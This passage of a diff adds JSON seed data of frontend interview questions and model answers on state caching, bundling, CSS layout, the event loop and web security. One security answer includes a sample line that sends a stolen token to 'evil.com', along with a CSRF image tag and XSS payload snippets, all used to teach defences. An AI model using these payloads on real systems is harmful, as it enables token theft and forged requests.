onError: (err, newTodo, context) => {\n      // ROLLBACK using the snapshot\n      if (context?.previousLikes) {\n        queryClient.setQueryData(['likes'], context.previousLikes);\n      }\n    },\n\n    // 3. Settle (Success or Fail)\n    onSettled: () => {\n      // REVALIDATE to ensure true consistency with server\n      queryClient.invalidateQueries({ queryKey: ['likes'] });\n    },\n  });\n};\n```\n\n### 3. Cache Persistence & Hydration\n\nFor \"Offline-First\" apps, memory cache isn't enough.\nWe use `persistQueryClient` to serialize the cache to localStorage/IndexedDB.\n\n**The \"Hash Mismatch\" Danger:**\nIf you deploy a new app version that changes the data structure, deserializing old cache breaks the app.\n*Fix:* Use `buster` strings in your persister configuration to force cache invalidation on version upgrades.\n\n```typescript\nconst persister = createSyncStoragePersister({\n  storage: window.localStorage,\n});\n// If 'v2' != stored version, wipe cache\npersistQueryClient({ queryClient, persister, buster: 'v2' });\n```\n",
+      "keyPoints": [
+        "Strict separation of Client vs Server state ownership",
+        "Race condition handling in Optimistic UI via 'cancelQueries'",
+        "The 'Context' pattern for rollback data",
+        "Versioning strategies for persistent cache (busters)"
+      ],
+      "followUpQuestions": [
+        "How do you handle 'Dependent Queries' where Request B needs Request A's ID?",
+        "Explain 'Structural Sharing' in React Query and how it preserves referential identity.",
+        "What is the 'Waterfalls' problem in data fetching and how does `useQueries` or prefetching solve it?"
+      ],
+      "relatedTopics": [
+        "distributed-systems",
+        "offline-first",
+        "state-machines"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Linear",
+        "Atlassian",
+        "Shopify"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "caching-memoization-005",
+      "category": "caching-memoization",
+      "difficulty": "senior",
+      "question": "In a high-performance Redux environment (e.g., data visualization), how do you balance Selector Computational Cost vs. Memory Overhead? Discuss 'Selector Thrashing' and the trade-offs of `weakMapMemoize` vs. `lruMemoize`.",
+      "answer": "## 1. The Cost of Derivation\n\nMemoization is a trade-off: **RAM for CPU**.\nIn data-intensive apps (e.g., 50k rows in a grid), blindly memoizing everything causes GC thrashing.\n\n### 2. Selector Thrashing\n\n**The Problem:**\nStandard Reselect (`lruMemoize` with size 1) only remembers the *last* arguments.\nIf you use the same selector in multiple components with different props, they overwrite each other's cache entry on every render.\n\n```typescript\n// Shared selector\nconst selectItem = createSelector(\n  [state => state.items, (_, id) => id],\n  (items, id) => items[id]\n);\n\n// Component A requests ID=1 -> Cache(1)\n// Component B requests ID=2 -> Cache(2) (Overwrites 1)\n// Component A re-renders -> Recalculates 1 (Thrashing)\n```\n\n**The Solution: Selector Factories (Instance Memoization)**\nCreate a unique selector instance *per component instance*.\n\n```typescript\nconst makeSelectItem = () => createSelector(\n  [state => state.items, (_, id) => id],\n  (items, id) => items[id]\n);\n\nfunction ListItem({ id }) {\n  // UseMemo ensures this selector instance lives as long as the component\n  const selectItemInstance = useMemo(makeSelectItem, []);\n  const item = useSelector(state => selectItemInstance(state, id));\n}\n```\n\n### 3. weakMapMemoize vs. lruMemoize (RTK 2.0+)\n\n**lruMemoize (The Classic):**\n- **Logic:** \"Keep the last N results.\"\n- **Pros:** Predictable size. Good for simple derived data.\n- **Cons:** Primitive argument limitations. Can leak if maxSize is too high.\n\n**weakMapMemoize (The Modern Standard):**\n- **Logic:** \"Keep results as long as the *Input Object* exists in memory.\"\n- **Pros:** Infinite cache size without memory leaks (GC handles it). extremely fast lookup.\n- **Cons:** Only works if arguments are Objects (references). Primitives cause fallback behavior.\n\n**Architectural Decision:**\n* Use `weakMapMemoize` for selectors deriving from the **Root State** (stable object reference).\n* Use `lruMemoize` for selectors taking **Filters/IDs** (primitives) as arguments.\n\n### 4. Input Stability Optimization\n\nA selector is only as good as its inputs. If an input selector returns a new reference (array.map), the memoization is useless.\n\n```typescript\n// ❌ Bad: 'slicing' creates a new array reference every time\nconst selectTop5 = createSelector(\n  [state => state.items.slice(0, 5)], \n  (items) => expensiveTransform(items)\n);\n\n// ✅ Good: Move the instability INSIDE the memoizer\nconst selectTop5 = createSelector(\n  [state => state.items], \n  (items) => {\n    // This function only runs if 'items' (the big array) changes\n    return expensiveTransform(items.slice(0, 5));\n  }\n);\n```\n",
+      "keyPoints": [
+        "Diagnosing Selector Thrashing in list virtualization",
+        "Factory Pattern for component-scoped memoization",
+        "Memory implications of WeakMap vs LRU strategies",
+        "Input Stability is more important than output caching"
+      ],
+      "followUpQuestions": [
+        "How does 'Proxy-based' memoization (like in Valatio/Zustand) differ from Selector caching?",
+        "Why is 'Reselect' considered a Push-Pull hybrid system?",
+        "How do you profile selector re-computations in Redux DevTools?"
+      ],
+      "relatedTopics": [
+        "redux-toolkit",
+        "memory-profiling",
+        "functional-programming"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Bloomberg",
+        "Goldman Sachs",
+        "DataDog"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "bundle-tree-shaking-001",
+      "category": "bundle-tree-shaking",
+      "difficulty": "senior",
+      "question": "Explain how tree shaking works in modern bundlers. Why do some libraries not tree-shake well, and how would you audit and fix bundle size issues?",
+      "answer": "## How Tree Shaking Works\n\nTree shaking is dead code elimination based on ES Module static analysis. Bundlers analyze import/export statements to determine which code is actually used.\n\n### Prerequisites for Tree Shaking\n\n```typescript\n// ✅ ES Modules - static, analyzable\nimport { map, filter } from 'lodash-es';\nexport const utils = { map, filter };\n\n// ❌ CommonJS - dynamic, not analyzable\nconst _ = require('lodash');\nmodule.exports = { map: _.map };\n```\n\n### Why Some Libraries Don't Tree-Shake\n\n**1. Side Effects in Module Scope:**\n```typescript\n// ❌ Bad: Side effect at module level\nconsole.log('Utils loaded!'); // Bundler can't remove this file\nexport const add = (a: number, b: number) => a + b;\n```\n\n**2. Missing sideEffects Field:**\n```json\n{\n  \"name\": \"my-library\",\n  \"sideEffects\": false\n}\n```\n\n**3. Barrel Files Anti-Pattern:**\n```typescript\n// ❌ Bad: Re-exporting everything\nexport * from './Button';\nexport * from './Card';\n// ... 50 more components\n```\n\n### Auditing Bundle Size\n\n```bash\n# Webpack Bundle Analyzer\nnpx webpack-bundle-analyzer stats.json\n\n# Vite\nnpm install rollup-plugin-visualizer\n```\n\n### Fixing Bundle Issues\n\n```typescript\n// 1. Direct imports instead of barrel files\nimport { Button } from './components/Button';\n\n// 2. Replace heavy libraries\nimport { debounce } from 'lodash-es'; // Instead of full lodash\n\n// 3. Dynamic imports for conditional features\nconst PDFExport = lazy(() => import('./PDFExport'));\n```",
+      "keyPoints": [
+        "Understands ES Modules requirement for tree shaking",
+        "Knows sideEffects field in package.json",
+        "Can identify barrel file anti-pattern",
+        "Familiar with bundle analysis tools"
+      ],
+      "followUpQuestions": [
+        "How does tree shaking differ between Webpack and Rollup?",
+        "What's the impact of CSS-in-JS on bundle size?"
+      ],
+      "relatedTopics": [
+        "webpack",
+        "vite",
+        "code-splitting",
+        "performance"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Vercel",
+        "Shopify"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "bundle-tree-shaking-002",
+      "category": "bundle-tree-shaking",
+      "difficulty": "mid",
+      "question": "Explain code splitting strategies in React. When would you use route-based vs component-based splitting?",
+      "answer": "## Code Splitting Strategies\n\n### Route-Based Splitting\nBest for: Pages/routes users may never visit\n\n```typescript\nconst Dashboard = lazy(() => import('./pages/Dashboard'));\nconst Settings = lazy(() => import('./pages/Settings'));\n\nfunction App() {\n  return (\n    <Suspense fallback={<PageSkeleton />}>\n      <Routes>\n        <Route path=\"/dashboard\" element={<Dashboard />} />\n        <Route path=\"/settings\" element={<Settings />} />\n      </Routes>\n    </Suspense>\n  );\n}\n```\n\n### Component-Based Splitting\nBest for: Heavy components not immediately visible\n\n```typescript\nconst HeavyModal = lazy(() => import('./HeavyModal'));\n\nfunction Page() {\n  const [showModal, setShowModal] = useState(false);\n  \n  return (\n    <>\n      <button onClick={() => setShowModal(true)}>Open</button>\n      {showModal && (\n        <Suspense fallback={<Spinner />}>\n          <HeavyModal />\n        </Suspense>\n      )}\n    </>\n  );\n}\n```\n\n### Preloading Strategies\n\n```typescript\n// Preload on hover\n<Link \n  to=\"/dashboard\"\n  onMouseEnter={() => import('./pages/Dashboard')}\n>\n  Dashboard\n</Link>\n```\n\n| Strategy | Use When |\n|----------|----------|\n| Route-based | Separate pages |\n| Component-based | Heavy below-fold content |\n| Feature-based | Conditional features |",
+      "keyPoints": [
+        "Understands route vs component splitting",
+        "Knows React.lazy and Suspense usage",
+        "Can implement preloading strategies"
+      ],
+      "followUpQuestions": [
+        "How would you handle chunk loading errors?",
+        "What's the overhead of too many small chunks?"
+      ],
+      "relatedTopics": [
+        "react-lazy",
+        "suspense",
+        "webpack"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Most React companies"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "security-auth-001",
+      "category": "security-auth",
+      "difficulty": "senior",
+      "question": "Compare localStorage vs HttpOnly cookies for storing authentication tokens. What are the security implications of each approach?",
+      "answer": "## Security Comparison\n\n| Aspect | localStorage | HttpOnly Cookie |\n|--------|-------------|-----------------|\n| XSS Vulnerability | **HIGH** - JS can read | **LOW** - JS cannot access |\n| CSRF Vulnerability | **LOW** - Not auto-sent | **HIGH** - Auto-sent |\n| Subdomains | Same origin only | Configurable |\n\n## XSS Attack Vector\n\n```typescript\n// localStorage - vulnerable to XSS\nconst stolenToken = localStorage.getItem('authToken');\nfetch('https://evil.com/steal', { body: stolenToken });\n\n// HttpOnly cookie - protected from XSS\ndocument.cookie; // HttpOnly cookies not visible\n```\n\n## CSRF Attack Vector\n\n```html\n<!-- HttpOnly cookie - vulnerable to CSRF -->\n<img src=\"https://bank.com/transfer?to=attacker&amount=1000\" />\n```\n\n## Best Practice: Hybrid Approach\n\n```typescript\n// Server\nres.cookie('refreshToken', token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict',\n  path: '/api/auth/refresh',\n});\n\n// Client - store access token in memory\nclass AuthManager {\n  private accessToken: string | null = null;\n  \n  async fetch(url: string, options: RequestInit = {}) {\n    return fetch(url, {\n      ...options,\n      credentials: 'include',\n      headers: {\n        ...options.headers,\n        'Authorization': `Bearer ${this.accessToken}`,\n      },\n    });\n  }\n}\n```\n\n**Recommendation:**\n- Access Token: Memory (15 min expiry)\n- Refresh Token: HttpOnly cookie\n- Add CSRF tokens for cookie-based requests",
+      "keyPoints": [
+        "Understands XSS vs CSRF attack vectors",
+        "Knows HttpOnly prevents JavaScript access",
+        "Recommends hybrid approach",
+        "Implements CSRF protection"
+      ],
+      "followUpQuestions": [
+        "How would you handle token refresh in a SPA?",
+        "What about subdomain cookie sharing?"
+      ],
+      "relatedTopics": [
+        "xss",
+        "csrf",
+        "jwt",
+        "session-management"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Any company handling auth"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "security-auth-002",
+      "category": "security-auth",
+      "difficulty": "mid",
+      "question": "What is XSS (Cross-Site Scripting)? Explain the different types and how to prevent them in a React application.",
+      "answer": "## XSS Types\n\n### 1. Stored XSS\nScript stored in database, served to all users.\n\n### 2. Reflected XSS\nScript reflected from URL parameters.\n\n### 3. DOM-based XSS\nClient-side JS manipulates DOM unsafely.\n\n## React's Built-in Protection\n\n```tsx\n// ✅ Safe - React escapes this\nfunction Comment({ text }: { text: string }) {\n  return <p>{text}</p>;\n}\n// \"<script>alert('xss')</script>\" → displayed as text\n```\n\n## React XSS Vulnerabilities\n\n### dangerouslySetInnerHTML\n\n```tsx\n// ❌ Dangerous\n<div dangerouslySetInnerHTML={{ __html: userInput }} />\n\n// ✅ Safe - sanitize first\nimport DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ \n  __html: DOMPurify.sanitize(userInput) \n}} />\n```\n\n### javascript: URLs\n\n```tsx\n// ❌ Vulnerable\n<a href={userUrl}>Link</a>\n// Attacker: javascript:alert('XSS')\n\n// ✅ Safe - validate protocol\nconst safeUrl = url.startsWith('http') ? url : '#';\n```\n\n## Prevention Checklist\n- Use React's default escaping\n- Sanitize HTML with DOMPurify\n- Validate URLs (block javascript:)\n- Implement Content Security Policy",
+      "keyPoints": [
+        "Can explain stored, reflected, DOM-based XSS",
+        "Understands React's automatic escaping",
+        "Knows dangerous patterns",
+        "Implements sanitization"
+      ],
+      "followUpQuestions": [
+        "How does CSP help prevent XSS?",
+        "What about XSS in SSR contexts?"
+      ],
+      "relatedTopics": [
+        "security",
+        "csp",
+        "sanitization"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Any security-conscious company"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "css-layout-001",
+      "category": "css-layout",
+      "difficulty": "senior",
+      "question": "Deep dive into the CSS Stacking Context: What triggers it, how does the browser determine paint order, and how do you architect z-index at scale?",
+      "answer": "## Stacking Context & The Z-Axis\n\nA stacking context is a three-dimensional conceptualization of HTML elements. Elements within a context are painted as a single atomic unit. A child element with `z-index: 9999` cannot break out of a parent stacking context that is ranked lower than a sibling.\n\n### 1. Creation Triggers (Common & Obscure)\n\n\nBeyond the root `<html>`, a new context is created by:\n* **Positioning**: `relative`, `absolute`, `fixed`, or `sticky` WITH a `z-index` other than `auto`.\n* **Visual Effects**: `opacity` < 1, `filter`, `mask`, `clip-path`, or `mix-blend-mode` (other than `normal`).\n* **Geometry**: `transform` (even `translateZ(0)`), `perspective`, or `container-type`.\n* **Explicit Intent**: `isolation: isolate` (the cleanest way to create a context without side effects).\n* **Performance Optimization**: `will-change` specifying any property that would create a context.\n\n### 2. The Global Stacking Order (Bottom to Top)\n1. **Background & Borders**: Of the element forming the context.\n2. **Negative Z-Index**: Descendants within the context.\n3. **Non-Positioned Blocks**: In DOM order.\n4. **Floats**: Non-positioned floating elements.\n5. **Inline Descendants**: Text and inline-level boxes.\n6. **Z-Index 0 / Auto**: Positioned descendants.\n7. **Positive Z-Index**: Ranked by value, then DOM order.\n\n### 3. Senior Debugging & Architecture\nTo prevent \"z-index wars,\" implement a tokenized scale:\n\n```css\n:root {\n  /* Increments of 10 or 100 to allow \"emergency\" overrides */\n  --z-base: 0;\n  --z-dropdown: 1000;\n  --z-sticky: 2000;\n  --z-modal-backdrop: 3000;\n  --z-modal-content: 3010;\n  --z-toast: 4000;\n}\n```\n\n**The \"Isolation\" Pattern:**\nUse `isolation: isolate` on components like Cards or Modals to ensure their internal `z-index` logic never leaks or interacts with the rest of the app.\n\n```typescript\n// Utility to find the nearest Stacking Context ancestor\nconst getStackingContext = (el: HTMLElement): HTMLElement | null => {\n  let node: HTMLElement | null = el;\n  while (node) {\n    const style = getComputedStyle(node);\n    if (\n      style.zIndex !== 'auto' || \n      style.opacity !== '1' || \n      style.transform !== 'none' ||\n      style.isolation === 'isolate'\n    ) return node;\n    node = node.parentElement;\n  }\n  return null;\n};\n```",
+      "keyPoints": [
+        "Explains the atomic nature of nested stacking contexts",
+        "Identifies non-obvious triggers like 'filter' and 'perspective'",
+        "Articulates the internal paint order (7-layer rule)",
+        "Proposes an architectural solution (Z-index tokens + isolation: isolate)"
+      ],
+      "followUpQuestions": [
+        "How do Portals in React help solve stacking context limitations?",
+        "Does a 'fixed' position element always create a stacking context in all browsers?"
+      ],
+      "relatedTopics": [
+        "Rendering Pipeline",
+        "Z-index Architecture",
+        "Portals"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Big Tech",
+        "Enterprise SaaS"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "css-layout-002",
+      "category": "css-layout",
+      "difficulty": "senior",
+      "question": "Compare Flexbox vs. Grid for complex application layouts. When does Grid's 2D approach become a performance or maintainability necessity?",
+      "answer": "## Architectural Comparison\n\n\n\n### 1. Dimensionality & Control\n* **Flexbox (Content-Out)**: One-dimensional. Best for components where the size of the content should dictate the layout (e.g., a dynamic navigation bar or a row of tags).\n* **Grid (Layout-In)**: Two-dimensional. Best for rigid structures where the container should dictate the placement of items (e.g., dashboard layouts, complex forms).\n\n### 2. Senior Use Cases for CSS Grid\n* **Subgrid**: Essential for aligning nested component parts (like card headers/footers) across multiple grid items.\n* **Overlapping**: Unlike Flexbox (which requires negative margins or absolute positioning), Grid allows multiple items to occupy the same cell/area naturally via `grid-area`.\n* **Named Areas**: Drastically improves maintainability for responsive design:\n  ```css\n  .dashboard {\n    display: grid;\n    grid-template-areas: \n      \"head head\"\n      \"side main\";\n  }\n  @media (max-width: 600px) {\n    .dashboard {\n      grid-template-areas: \n        \"head\"\n        \"main\"\n        \"side\";\n    }\n  }\n  ```\n\n### 3. Performance Considerations\nWhile Flexbox is generally \"cheaper\" to calculate for small components, complex 2D layouts using nested Flexboxes can lead to \"Layout Thrashing\" because the browser has to calculate the height of the row to determine the width of the items, then re-calculate. Grid handles these two axes simultaneously, often resulting in more predictable rendering in complex UIs.",
+      "keyPoints": [
+        "Distinguishes between 'Content-Out' (Flex) and 'Layout-In' (Grid) philosophies",
+        "Advocates for 'subgrid' to solve cross-component alignment",
+        "Explains 'grid-template-areas' as a maintainability win",
+        "Mentions performance implications of nested layout engines"
+      ],
+      "followUpQuestions": [
+        "How do Container Queries change the way we use Grid?",
+        "When is 'display: contents' useful in a Grid/Flex environment?"
+      ],
+      "relatedTopics": [
+        "Responsive Architecture",
+        "Subgrid",
+        "Layout Performance"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Fintech Dashboards",
+        "Design Systems Teams"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "css-layout-003",
+      "category": "css-layout",
+      "difficulty": "senior",
+      "question": "What is a Block Formatting Context (BFC), and why is 'display: flow-root' the modern standard for component isolation?",
+      "answer": "## The Block Formatting Context (BFC)\n\nA BFC is an independent layout mini-universe. Things happening inside a BFC (like floats or margins) stay inside that BFC.\n\n### 1. Key Responsibilities of a BFC\n* **Containment of Floats**: A BFC container will grow to encompass its floated children (eliminating the need for old Clearfix hacks).\n* **Margin Collapse Prevention**: Vertical margins of elements inside a BFC will not collapse with the margins of the BFC container itself.\n* **Float Interference**: Elements forming a BFC will not overlap with external floats; instead, they will sit alongside them (useful for sidebars).\n\n### 2. The Evolution of BFC Creation\n\n\n| Method | Side Effects | Modern Status |\n| :--- | :--- | :--- |\n| `overflow: hidden` | Clips tooltips/shadows; hides scrollbars | Legacy / Risky |\n| `float: left/right` | Changes element flow; width becomes shrink-wrap | Specialized only |\n| `display: inline-block`| Adds whitespace issues; breaks block flow | Specific UI needs |\n| **`display: flow-root`** | **None.** Creates a BFC with zero side effects. | **Modern Standard** |\n\n### 3. The \"Why\" for Senior Developers\nIn modern component-based architecture (React/Vue/Web Components), using `display: flow-root` on your wrapper ensures that your component is **layout-pure**. It won't accidentally collapse its margins into the parent page, and it won't break if a consumer of your component uses floats nearby.\n\n```css\n/* The 'Layout-Safe' Component Wrapper */\n.component-root {\n  display: flow-root;\n  contain: layout; /* Further optimization for rendering performance */\n}\n```",
+      "keyPoints": [
+        "Defines BFC as a layout sandbox",
+        "Explains the mechanics of margin collapse and float containment",
+        "Champions 'display: flow-root' as the side-effect-free successor to 'overflow: hidden'",
+        "Links BFC to component-based isolation principles"
+      ],
+      "followUpQuestions": [
+        "How does 'contain: layout' differ from a BFC?",
+        "Does Flexbox create a BFC for its children?"
+      ],
+      "relatedTopics": [
+        "Margin Collapse",
+        "Layout Engines",
+        "Component Encapsulation"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Senior Frontend Roles"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "js-event-loop-001",
+      "category": "js-event-loop",
+      "difficulty": "senior",
+      "question": "Explain the JavaScript Event Loop architecture in depth. Differentiate between the Macrotask and Microtask queues, explain the specific timing of the Rendering phase, and walk through a complex execution example.",
+      "answer": "## Event Loop Architecture\n\nThe JavaScript runtime is single-threaded, relying on the Event Loop to handle asynchronous concurrency.\n\n### Visual Model\n```\n┌─────────────────────────────────────────────────────────┐\n│                       Call Stack                         │\n│             (Executes synchronous Frames)               │\n└─────────────────────────────────────────────────────────┘\n                          │\n                          ▼\n┌─────────────────────────────────────────────────────────┐\n│                      Event Loop                          │\n│  1. Execute Stack (until empty)                         │\n│  2. Drain Microtasks (Run ALL until queue is empty)     │\n│  3. Render Phase (if needed: Style -> Layout -> Paint)  │\n│  4. Execute ONE Macrotask                               │\n│  5. Repeat                                              │\n└─────────────────────────────────────────────────────────┘\n```\n\n### The Critical Distinction\n1.  **Microtasks (High Priority)**\n    * *Sources*: `Promise.then`, `queueMicrotask`, `MutationObserver`, `process.nextTick` (Node).\n    * *Behavior*: The engine processes microtasks **immediately** after the call stack empties and *before* yielding control to the browser for rendering.\n    * *Risk*: If microtasks recursively queue more microtasks, the Event Loop will never reach the Render phase, causing the page to freeze (Infinite Loop).\n\n2.  **Macrotasks (Task Queue)**\n    * *Sources*: `setTimeout`, `setInterval`, `setImmediate`, I/O, UI Events.\n    * *Behavior*: The engine processes **exactly one** macrotask per loop tick. After that one task, it checks the Microtask queue again.\n\n### Execution Walkthrough\n\n```typescript\nconsole.log('1: Sync');\n\n// Macrotask\nsetTimeout(() => {\n  console.log('2: Timeout');\n  Promise.resolve().then(() => console.log('3: Microtask in Timeout'));\n}, 0);\n\n// Microtask\nPromise.resolve()\n  .then(() => {\n    console.log('4: Promise 1');\n    queueMicrotask(() => console.log('5: Nested Microtask'));\n  })\n  .then(() => console.log('6: Promise Chain'));\n\n// Render Phase (approximate)\nrequestAnimationFrame(() => console.log('7: rAF'));\n\nconsole.log('8: Sync End');\n```\n\n**Output Order:**\n1.  `1: Sync`\n2.  `8: Sync End` (Stack clears)\n3.  `4: Promise 1` (Microtask queue starts draining)\n4.  `5: Nested Microtask` (Added to front of queue relative to macrotasks)\n5.  `6: Promise Chain`\n6.  `7: rAF` (Microtasks empty → Render Phase)\n7.  `2: Timeout` (Next Loop Tick: Run ONE Macrotask)\n8.  `3: Microtask in Timeout` (Checks microtasks immediately after macrotask)\n\n### Practical Implications\n* **Batching**: React (and other libraries) use microtasks to batch state updates. Multiple state changes sync, then the component re-renders once when the microtask queue empties.\n* **Heavy Processing**: Do not split heavy work using `Promise.resolve()`. It will still block rendering. Split heavy work using `setTimeout` (Macrotasks) to yield control to the UI between chunks.",
+      "keyPoints": [
+        "Microtasks drain completely before Rendering or next Macrotask",
+        "Rendering happens between Microtasks and Macrotasks",
+        "Recursive microtasks block the UI; Macrotasks do not",
+        "rAF runs before the Paint step of the Render phase"
+      ],
+      "followUpQuestions": [
+        "How does 'process.nextTick' in Node.js differ from 'queueMicrotask'?",
+        "Why is 'requestAnimationFrame' preferred over 'setTimeout' for animations?",
+        "How does the Event Loop handle Web Workers?"
+      ],
+      "relatedTopics": [
+        "performance",
+        "async-programming",
+        "browser-internals"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Senior Frontend Roles",
+        "Platform Engineering"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "js-event-loop-002",
+      "category": "js-event-loop",
+      "difficulty": "senior",
+      "question": "Deep dive into 'async/await'. How is it executed under the hood, and precisely where do 'await' expressions pause execution in relation to the Microtask Queue?",
+      "answer": "## async/await Under the Hood\n\n`async/await` is syntactic sugar over **Generators** yielded into **Promises**.\n\n### The Mechanism\nWhen the engine encounters an `await` keyword, it suspends the execution of the `async` function and effectively returns a pending Promise to the caller. The resumption of the function is scheduled as a **microtask** once the awaited value resolves.\n\n### Transpilation Mental Model\n\nCode written as:\n```typescript\nasync function fetchUser() {\n  console.log('A');\n  await fetch('/api');\n  console.log('B');\n}\n```\n\nIs executed roughly as:\n```typescript\nfunction fetchUser() {\n  console.log('A'); // Synchronous\n  \n  // Await wraps value in Promise.resolve()\n  return Promise.resolve(fetch('/api')).then(() => {\n    // The rest of the function is the .then() callback (Microtask)\n    console.log('B'); \n  });\n}\n```\n\n### Critical Nuances for Seniors\n\n1.  **Await Costs a Tick**:\n    Even if you `await` a non-promise value (e.g., `await 42`), the engine wraps it in `Promise.resolve(42)`. The function execution *always* suspends and resumes in a future microtask tick.\n\n2.  **Parallelism vs. Sequential**:\n    A common senior-level mistake is awaiting inside loops sequentially.\n    * *Sequential (Slow)*: `for (const id of ids) await fetch(id)`\n    * *Parallel (Fast)*: `await Promise.all(ids.map(fetch))`\n\n3.  **Error Handling**:\n    Because `await` resumes execution *within* the function scope, standard `try/catch` blocks work for asynchronous errors, unlike raw Promises where you need `.catch()`.\n\n4.  **Top-Level Await**:\n    In ES Modules, top-level await blocks the *module graph*. If Module A imports Module B, and Module B uses top-level await, Module A will not execute until Module B resolves.",
+      "keyPoints": [
+        "Await suspends execution and returns a pending Promise",
+        "Resumption happens via the Microtask Queue",
+        "Await always costs one microtask tick, even for primitives",
+        "Top-level await blocks module graph execution"
+      ],
+      "followUpQuestions": [
+        "How does 'Promise.all' fail fast versus 'Promise.allSettled'?",
+        "Construct a 'promisify' utility function from scratch.",
+        "Explain the difference between parallel and concurrent execution."
+      ],
+      "relatedTopics": [
+        "generators",
+        "promises",
+        "transpilation"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Full Stack Roles",
+        "Library Maintainers"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "js-event-loop-003",
+      "category": "js-event-loop",
+      "difficulty": "mid",
+      "question": "Identify common patterns that lead to memory leaks in JavaScript SPA (Single Page Applications) and describe modern tooling strategies to detect them.",
+      "answer": "## Memory Leak Patterns\n\nIn garbage-collected languages, a leak occurs when objects are no longer needed but remain referenced by a \"Root\" (e.g., `window`, `document`, or a closure).\n\n### 1. The 'Forgotten' References\n* **Event Listeners**: Adding `window.addEventListener` in a component mount without removing it on unmount. The listener callback holds a reference to the component scope, preventing GC.\n* **Timers**: An active `setInterval` keeps its callback and closure scope alive indefinitely.\n* **Closures**: A variable caught in a closure scope that is referenced by a long-lived object (like a global cache) will never be collected.\n\n### 2. Detached DOM Nodes\nA subtle leak where a JS variable holds a reference to a DOM node that has been removed from the document.\n```typescript\nlet detachedNodes: HTMLElement[] = [];\nfunction remove() {\n  const btn = document.getElementById('btn');\n  document.body.removeChild(btn!); \n  // LEAK: 'btn' is gone from screen, but referenced in 'detachedNodes'\n  // The entire DOM tree starting at 'btn' is retained in memory.\n  detachedNodes.push(btn!); \n}\n```\n\n### 3. Weak References\nUsing standard `Map` or `Set` to associate data with DOM elements creates strong references.\n* **Fix**: Use `WeakMap` or `WeakSet`. These hold \"weak\" references, allowing the GC to collect the entry if the object is not referenced elsewhere.\n\n## Detection Strategies\n\n### Chrome DevTools\n1.  **Heap Snapshots (Comparison Method)**:\n    * Take Snapshot 1 (Base).\n    * Perform action (e.g., Open/Close Modal).\n    * Take Snapshot 2 (Target).\n    * *Filter*: \"Objects allocated between Snapshot 1 and 2\". Look for component instances that should have been destroyed.\n2.  **Allocation Timeline**:\n    * Visualizes memory spikes (blue bars). If the blue bars don't turn grey (GC) after the action ends, memory is being retained.\n3.  **Performance Monitor**:\n    * Watch **DOM Nodes** count. If it monotonically increases as you navigate the app, you have a Detached DOM leak.",
+      "keyPoints": [
+        "Understand Mark-and-Sweep reachability",
+        "Identify Detached DOM node leaks",
+        "Know when to use WeakMap/WeakRef",
+        "Proficiency with Chrome Heap Snapshots"
+      ],
+      "followUpQuestions": [
+        "How does the Mark-and-Sweep algorithm determine reachability?",
+        "What is the specific use case for 'FinalizationRegistry'?"
+      ],
+      "relatedTopics": [
+        "garbage-collection",
+        "profiling",
+        "web-performance"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Performance Optimization Roles",
+        "Large Scale SPAs"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "accessibility-001",
+      "category": "accessibility",
+      "difficulty": "senior",
+      "question": "Design a highly reusable, fully accessible 'Select' component (Combobox pattern). Explain the critical differences between the ARIA `combobox` and `menu` roles, and implement the keyboard logic using `aria-activedescendant` for performance.",
